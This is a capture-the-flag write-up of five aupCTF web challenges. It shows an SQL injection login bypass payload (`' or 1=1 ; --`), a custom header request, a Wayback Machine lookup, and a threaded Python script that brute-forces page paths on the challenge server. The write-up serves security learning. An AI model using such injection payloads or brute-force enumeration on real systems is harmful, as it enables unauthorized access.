# Web challenges from aupCTF
- [Starter](#starter)
- [SQLi - 1](#sqli-1)
- [Header](#header)
- [Time Heist](#time-heist)
- [Directory](#directory)

5/7 challenges solved

-----

## Starter

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/6582dbba-0cac-4bec-ad06-f4c37c2be3f1)

Link: [https://challs.aupctf.live/starter/](https://challs.aupctf.live/starter/){:target="_blank" rel="noopener"}

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/30b5e614-f821-47e4-bd2a-712ce5ecb0bc)

Flag is randomly placed in the site. I removed all the CSS styling which made the flag.

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/7525456f-aaf6-4168-b69e-26c387eb5805)

Flag: `aupCTF{w45n't-th47-h4rd-r1gh7}`

-----

## SQLi-1

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/fbd66fca-dbce-4038-b462-49fc7228ba51)

Link: [https://challs.aupctf.live/sqli-1/](https://challs.aupctf.live/sqli-1/){:target="_blank" rel="noopener"}

I tried base `admin` as username and `' or 1=1 ; --` as password.

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/10d62981-6ac8-49c8-9092-c15c3f18a3bf)

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/ed2890ca-a957-4e16-aa35-9507e52295e3)

Flag: `aupCTF{3a5y-sql-1nj3cti0n}`

-----
## Header

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/5dadbc34-0f33-45c2-9120-f6d13d8bbd2f)

Link: [https://challs.aupctf.live/header/](https://challs.aupctf.live/header/){:target="_blank" rel="noopener"}

Going to site shows some Django python code:

```py
def headar_easy(request):
    if request.META.get('HTTP_GETFLAG') == 'yes':
        context = {
            'flag': '[REDACTED]',
        }
        
        return render(request, 'aa/flag.html', context)
    
    return render(request, 'aa/index.html')
```

So I sent a request wih the header `GETFLAG` being `yes` using [Postman](https://web.postman.co/){:target="_blank" rel="noopener"}

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/f1fb6a9e-d168-44d0-b30d-50432909c9c8)

Flag: `aupCTF{cust0m-he4d3r-r3qu3st}`

-----

## Time-Heist

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/84e9f2ff-d17d-44de-80a9-869611a002a9)

Hint: try looking for a tag named flag

Link: [https://iasad.me/tags](https://iasad.me/tags){:target="_blank" rel="noopener"}

I went to [Web archive](https://archive.org/) to find the possible tag named flag. There was one recently 
[https://web.archive.org/web/20230605190025/https://iasad.me/tags](https://web.archive.org/web/20230605190025/https://iasad.me/tags){:target="_blank" rel="noopener"}

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/482e2153-9a2e-4ef2-9760-61ae56d1aa64)

Going to [https://web.archive.org/web/20230601061319/https://iasad.me/tags/flag/](https://web.archive.org/web/20230601061319/https://iasad.me/tags/flag/){:target="_blank" rel="noopener"} and then to [https://web.archive.org/web/20230601045526/https://iasad.me/blogs/flag/](https://web.archive.org/web/20230601045526/https://iasad.me/blogs/flag/){:target="_blank" rel="noopener"} and looking at source:

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/6659b5bf-bc26-4491-8edf-36e72a7d6ec1)

Flag: `aupCTF{y0u-ar3-4-tru3-t1m3-tr4v3l3r}`

-----

## Directory

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/f0d8d6c6-5cf9-4b67-b64d-228e087a2661)

Link: [https://challs.aupctf.live/dir/](https://challs.aupctf.live/dir/){:target="_blank" rel="noopener"}

![image](https://github.com/jeromepalayoor/ctf-writeups/assets/63996033/294945b8-7605-427e-9017-f9377594fd49)

The flag is in one of the 1000 links, I created a python script to brute force it using threading:

```py
import requests
import threading

url = "https://challs.aupctf.live/dir/page/"


def do(range_):
    for i in range(range_,range_+100):
        r = requests.get(url + str(i) + "/")
        if "No flag for you" not in r.text:
            print(i,r.text)


threads = []
for i in range(0, 10000, 100):
    t = threading.Thread(target=do, args=(i,))
    threads.append(t)
    t.start()
```

Within 2 seconds it got the flag at [page 712](https://challs.aupctf.live/dir/page/712/){:target="_blank" rel="noopener"}:

```
712 <!DOCTYPE html>
<html>
<head>
    <title>You Found Me</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        h1, h2{
            text-align: center;
            margin-top: 50px;
        }

    </style>
</head>
<body>
    <h1>Here is your flag, You deserve it</h1>
    <br>
    <h2>The flag is: aupCTF{d1r3ct0r13s-tr1v14l-fl4g}</h2>
</body>
</html>
```

Flag: `aupCTF{d1r3ct0r13s-tr1v14l-fl4g}`
